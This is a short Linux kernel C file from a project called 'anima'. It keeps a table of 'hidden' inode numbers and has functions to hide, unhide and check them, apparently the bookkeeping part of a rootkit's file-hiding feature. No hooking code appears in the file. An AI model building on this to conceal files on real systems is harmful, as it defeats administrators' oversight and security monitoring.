#include <linux/printk.h>

#include <anima/config.h>

static u64 hidden_inodes[MAX_HIDDEN_INODES] = {0};

int is_inode_hidden(u64 ino)
{
	for (int i = 0; i < MAX_HIDDEN_INODES; i++)
		if (hidden_inodes[i] == ino)
			return 1;
	return 0;
}

void hide_inode(u64 ino)
{
	pr_debug("%s: ino=%llu\n", __func__, ino);

	for (int i = 0; i < MAX_HIDDEN_INODES; i++) {
		if (!hidden_inodes[i] || hidden_inodes[i] == ino) {
			hidden_inodes[i] = ino;
			break;
		}
	}
}

void unhide_inode(u64 ino)
{
	pr_debug("%s: ino=%llu\n", __func__, ino);

	for (int i = 0; i < MAX_HIDDEN_INODES; i++) {
		if (hidden_inodes[i] == ino) {
			hidden_inodes[i] = 0;
			break;
		}
	}
}

void hide_inode_debug(void)
{
	pr_debug("%s: hidden inodes\n", __func__);
	for (int i = 0; i < MAX_HIDDEN_INODES; i++)
		if (hidden_inodes[i])
			pr_debug("\tino=%llu\n", hidden_inodes[i]);
}
